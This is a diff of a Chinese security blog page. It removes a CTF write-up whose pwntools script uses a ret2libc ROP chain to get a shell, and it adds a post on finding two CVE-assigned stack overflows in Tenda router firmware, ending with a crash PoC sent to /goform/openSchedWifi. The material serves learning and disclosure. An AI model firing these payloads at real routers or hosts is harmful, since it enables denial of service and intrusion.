@@ -5,8 +5,8 @@
 <head>
     <meta charset="utf-8">
     <meta name="baidu-site-verification" content="codeva-1wZQQJBzcr" />
-    <meta name="keywords" content="bjdctf_2020_babyrop, Linux，二进制，IoT，CTF">
-    <meta name="description" content="libc泄露">
+    <meta name="keywords" content="【一炮双响】记第一次实战漏洞挖掘(路由器版), Linux，二进制，IoT，CTF">
+    <meta name="description" content="喜提CVE两连号(五位的!!)">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>bjdctf_2020_babyrop | 8023</title>
+    <title>【一炮双响】记第一次实战漏洞挖掘(路由器版) | 8023</title>
     <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
     
     <style>
@@ -337,12 +337,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/28.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">bjdctf_2020_babyrop</h1>
+                    <h1 class="description center-align post-title">【一炮双响】记第一次实战漏洞挖掘(路由器版)</h1>
                 </div>
             </div>
         </div>
@@ -366,8 +366,20 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/pwn/">
-                                <span class="chip bg-color">pwn</span>
+                            <a href="/tags/%E7%AC%94%E8%AE%B0/">
+                                <span class="chip bg-color">笔记</span>
+                            </a>
+                        
+                            <a href="/tags/2025/">
+                                <span class="chip bg-color">2025</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
+                                <span class="chip bg-color">漏洞挖掘</span>
+                            </a>
+                        
+                            <a href="/tags/IoT/">
+                                <span class="chip bg-color">IoT</span>
                             </a>
                         
                     </div>
@@ -378,8 +390,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/writeup/" class="post-category">
-                                writeup
+                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category">
+                                笔记
                             </a>
                         
                     </div>
@@ -391,7 +403,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-06-26
+                    2025-01-16
                 </div>
                 
 
@@ -400,14 +412,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    474
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    4 分
                 </div>
                 
 
@@ -450,74 +462,70 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <span id="more"></span>
-<h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><p>检查保护机制，开启NX，64位</p>
-<p><img src="/img/image-20210626120953251.png"></p>
-<p>运行程序，看见有libc的字眼，想到应该和libc泄露有关</p>
-<p><img src="/img/image-20210626121205881.png"></p>
-<p>shift+F12查找字符串，没有找到system(‘/bin/sh’)，看样子应该就是这个类型的题了</p>
-<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p><img src="/img/image-20210626121435224.png"></p>
-<p>看到一个vuln()函数，应该会是解题的关键，点进去看，果然</p>
-<p><img src="/img/image-20210626121534041.png"></p>
-<p>找到了漏洞，read读入长度为0x64，buf大小为0x20，就从这个地方切入</p>
-<p><img src="/img/image-20210626122951905.png"></p>
-<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.利用puts函数去泄露libc版本</p>
-<p>2.计算偏移量，算出程序里的system函数和字符串’/bin/sh’的地址</p>
-<p>3.利用溢出漏洞，构造rop，夺权</p>
-<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>先泄露libc，64位程序传参时需要用到寄存器</p>
-<p>当参数少于7个时，参数从左到右放入寄存器：rdi,rsi,rdx,rcx,r8,r9</p>
-<p>当参数大于等于7个时，前6个就是前面6个，后面的参数就从右向左放入栈中，和32位一样</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary bjdctf_2020_babyrop <span class="token operator">|</span>grep <span class="token string">"pop rdi"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <h1 id="一炮双响-记第一次实战漏洞挖掘-路由器版"><a href="#一炮双响-记第一次实战漏洞挖掘-路由器版" class="headerlink" title="[一炮双响]记第一次实战漏洞挖掘(路由器版)"></a>[一炮双响]记第一次实战漏洞挖掘(路由器版)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>**<code>路由器</code>**的洞大部分都是栈溢出，如果想要了解一些相关的知识，可以去看我的pwn和二进制安全虚拟机Protostar靶场系列文章，<a target="_blank" rel="noopener" href="http://pr0b1em.top/2024/111155bf.html">传送门</a></p>
+<h3 id="什么是缓冲区溢出"><a href="#什么是缓冲区溢出" class="headerlink" title="什么是缓冲区溢出"></a>什么是缓冲区溢出</h3><p>在程序运行时，系统会为程序在内存里生成一个固定空间，如果超过了这个空间，就会造成缓冲区溢出，可以导致<strong>程序运行失败</strong>、<strong>系统宕机</strong>、<strong>重新启动</strong>等后果。更为严重的是，甚至可以<strong>取得系统特权</strong>，进而进行各种非法操作。</p>
+<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h3><p>第一步从路由器官网提取更新固件，放进kali中，用binwalk工具对固件内容进行提取，一般都是.bin文件，大部分的老版本固件都可以提取，<del>新版本涉及到更高的加密，好像是不能完全提取，也可能是我binwalk版本不够</del></p>
+<p><strong>提取命令</strong></p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">binwalk <span class="token operator">-</span>Me xxxx<span class="token punctuation">.</span>bin <span class="token operator">--</span>run-as=root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/img/image-20210626122850728.png"></p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'pull up your sword and tell me u story!'</span><span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
-puts_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/img/image-20250116124841896.png"></p>
+<p>提取出来以后，有一个squashfs-root文件夹，类似于Linux系统的根目录,我这里多了几个qemu开头的文件，是因为我进行了虚拟环境测试漏洞存在而产生的，后续会讲到</p>
+<p><img src="/img/image-20250116125044870.png"></p>
+<p>我们进入此目录后，需要分析的文件在bin目录下的httpd，这是路由器运行的主要文件</p>
+<p><img src="/img/image-20250116125356202.png"></p>
+<p>使用file指令查看了httpd文件的格式，是32位ELF文件，MIPS架构</p>
+<h3 id="qemu虚拟环境"><a href="#qemu虚拟环境" class="headerlink" title="qemu虚拟环境"></a>qemu虚拟环境</h3><p>apt安装qemu</p>
+<pre class="line-numbers language-none"><code class="language-none">apt install qemu
+apt install qemu-user-static
+sudo apt install qemu-system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p>然后计算偏移量，算出system和/bin/sh的地址</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">offset<span class="token operator">=</span>puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
-system<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
-bin_sh<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>使用qemu模拟启动httpd</p>
+<pre class="line-numbers language-none"><code class="language-none">qemu-mipsel-static -L . ./bin/httpd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>最后构造rop，夺权</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'pull up your sword and tell me u story!'</span><span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/img/image-20250116134735975.png"></p>
+<p>启动后就是这样，因为是虚拟环境，有些需要的工具或者文件丢失，不过不影响运行和后续测试</p>
+<p>当然还要配置虚拟网桥，可以传送到我的<a target="_blank" rel="noopener" href="http://pr0b1em.top/2025/0113be06.html">路由器准备工作</a>一文</p>
+<p>上面的qemu安装指令，或许有些差异，因为当时我安装qemu时出现过一些问题，经过问询gpt才得以解决，但是过了半个月，具体的安装步骤也记不清了，大家如果安装出现问题，也多问问AI，确实很方便</p>
+<h3 id="IDA静态分析文件"><a href="#IDA静态分析文件" class="headerlink" title="IDA静态分析文件"></a>IDA静态分析文件</h3><p>确定了文件的格式，直接使用工具IDA Pro进行反编译，开始分析源码逐个寻找漏洞</p>
+<p><img src="/img/image-20250116125755762.png"></p>
+<p>根据前期的学习，对栈溢出漏洞已经很熟悉了，大部分的栈溢出漏洞都来源于这些函数：</p>
+<ul>
+<li><strong>strcpy</strong>、<strong>strcat</strong>、<strong>sprintf</strong> 等字符串处理函数，特别是在没有检查缓冲区大小时。</li>
+<li><strong>scanf</strong>、<strong>sscanf</strong>、<strong>fgets</strong> 等输入输出函数，特别是处理字符串时没有设置最大读取长度。</li>
+<li><strong>gets</strong> 和 <strong>fgets</strong>，<strong>gets</strong> 是已废弃的最典型的栈溢出来源。</li>
+<li><strong>memcpy</strong>、<strong>memmove</strong> 等内存操作函数，在复制或移动数据时没有对目标缓冲区的大小进行检查。</li>
+<li><strong>alloca</strong>，用于栈上动态分配内存时，如果分配的内存过大，可能导致栈溢出。</li>
+</ul>
+<p>所以直接ctrl+F进行函数搜索，加快进度，不然几百上千个函数，能给我眼睛看瞎:-(</p>
+<p>根据网上的很多博客内容知道了Tenda路由器主要的漏洞就出现在strcpy、sscanf、sprintf函数上，于是我就开门见山先上strcpy函数，还是逐个看，但是已经少了很多工作量</p>
+<p><img src="/img/image-20250116130342704.png"></p>
+<p>nia，这就是案发现场</p>
+<p><img src="/img/image-20250116130505946.png"></p>
+<p>只能说不枉平日里打比赛的训练，敏锐的观察告诉我，这里就是有漏洞，不找不知道，一找就是俩！</p>
+<p><img src="/img/image-20250116130659977.png"></p>
+<p><img src="/img/image-20250116130735837.png"></p>
+<p>简单给大家解释一下这两个漏洞的原理：</p>
+<p>**<code>strcpy</code>**函数是stringcopy的缩写，顾名思义就是字符串复制，这个函数本身存在的漏洞就是，在进行内容复制，将一个变量里的字符串复制到另一个变量时，不会检查空间大小，这就会导致缓冲区溢出。</p>
+<p>(换个大家都能听懂的说法就是，一瓶1L的水装满了，现在要机器人执行命令把他完全倒入另一个只有500mL容量的瓶了，因为机器人不会判断，只会接受指令，就好比这里的**<code>strcpy</code>**函数，指令执行了，500mL装满，剩下的溢出)当然这个形容也不是完全恰当，只是关键点就那个意思。</p>
+<p>那么了解了这个地方的漏洞点，我们就写POC来尝试验证漏洞是否存在</p>
+<p>继续跟进看见这个函数的利用函数是openSchedwifi函数，一级目录名是goform</p>
+<p><img src="/img/image-20250116133743362.png"></p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
 
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
+url <span class="token operator">=</span> <span class="token string">"http://192.168.1.100/goform/openSchedWifi"</span>
+data <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">"schedStartTime"</span><span class="token punctuation">:</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">1000</span>
+        <span class="token string">"schedEndTime"</span><span class="token punctuation">:</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">1000</span>
+<span class="token punctuation">}</span>
+requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25680</span><span class="token punctuation">)</span>
-elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">/</span>bjdctf_2020_babyrop'<span class="token punctuation">)</span>
-context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
-        
-main<span class="token operator">=</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
-puts_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-puts_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-pop_rdi<span class="token operator">=</span><span class="token number">0x400733</span>
-        
-payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'pull up your sword and tell me u story!'</span><span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
-puts_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>
-        
-offset<span class="token operator">=</span>puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
-system<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
-bin_sh<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>
-        
-payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'pull up your sword and tell me u story!'</span><span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-        
-r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>最后拿到flag</p>
-<p><img src="/img/image-20210626130027859.png"></p>
+<p>执行POC脚本后，出现**<code>Segmentation fault</code>**，段错误退出当前程序，说明漏洞利用成功，因为传入了大量数据导致缓冲区溢出，程序返回异常退出！</p>
+<p><img src="/img/image-20250116133454406.png"></p>
+<p>那么这一次漏洞挖掘到这里就算完了，接下来就是提交CVE官网，等候回复，果然功夫不负有心人，成功收到两个CVE编号</p>
+<p><img src="/img/58a201102297b78ce047717a550cf6f.png"></p>
+<p><img src="/img/59b6f0cef463450a97851a94a4a2711.png"></p>
+<p>更多关于该漏洞的内容可以查看<a target="_blank" rel="noopener" href="https://github.com/Pr0b1em/IoT/blob/master/Tenda%20AC8v4%20V16.03.34.06.md">我的github</a></p>
+<p>Over！</p>
 
                 
             </div>
@@ -544,7 +552,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Pr0b1em.github.io/2021/06268fcf.html">https://Pr0b1em.github.io/2021/06268fcf.html</a>
+                    <a href="https://Pr0b1em.github.io/2025/01166d4b.html">https://Pr0b1em.github.io/2025/01166d4b.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -582,8 +590,20 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/pwn/">
-                                    <span class="chip bg-color">pwn</span>
+                                <a href="/tags/%E7%AC%94%E8%AE%B0/">
+                                    <span class="chip bg-color">笔记</span>
+                                </a>
+                            
+                                <a href="/tags/2025/">
+                                    <span class="chip bg-color">2025</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
+                                    <span class="chip bg-color">漏洞挖掘</span>
+                                </a>
+                            
+                                <a href="/tags/IoT/">
+                                    <span class="chip bg-color">IoT</span>
                                 </a>
                             
                         </div>
@@ -662,29 +682,92 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/0626e56e.html">
+                <a href="/2025/01166d4b.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="一些危险函数和64位寄存器与32位不同之处">
+                        <img src="/medias/featureimages/28.jpg" class="responsive-img" alt="【一炮双响】记第一次实战漏洞挖掘(路由器版)">
                         
-                        <span class="card-title">一些危险函数和64位寄存器与32位不同之处</span>
+                        <span class="card-title">【一炮双响】记第一次实战漏洞挖掘(路由器版)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            做题心得
+                            喜提CVE两连号(五位的!!)
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-06-26
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    笔记
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%AC%94%E8%AE%B0/">
+                        <span class="chip bg-color">笔记</span>
+                    </a>
+                    
+                    <a href="/tags/2025/">
+                        <span class="chip bg-color">2025</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
+                        <span class="chip bg-color">漏洞挖掘</span>
+                    </a>
+                    
+                    <a href="/tags/IoT/">
+                        <span class="chip bg-color">IoT</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/0113be06.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="wsl搭建虚拟网桥指令">
+                        
+                        <span class="card-title">wsl搭建虚拟网桥指令</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            路由器挖洞准备工作
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-13
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -700,57 +783,20 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%AC%94%E8%AE%B0/">
-                        <span class="chip bg-color">笔记</span>
+                    <a href="/tags/wsl/">
+                        <span class="chip bg-color">wsl</span>
                     </a>
                     
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/06256e50.html">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/24.jpg" class="responsive-img" alt="铁人三项(第五赛区)_2018_rop">
-                        
-                        <span class="card-title">铁人三项(第五赛区)_2018_rop</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            2018_rop
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-25
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/writeup/" class="post-category">
-                                    writeup
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
+                    <a href="/tags/2025/">
+                        <span class="chip bg-color">2025</span>
+                    </a>
                     
-                    <a href="/tags/pwn/">
-                        <span class="chip bg-color">pwn</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
+                        <span class="chip bg-color">漏洞挖掘</span>
+                    </a>
+                    
+                    <a href="/tags/IoT/">
+                        <span class="chip bg-color">IoT</span>
                     </a>
                     
                 </div>
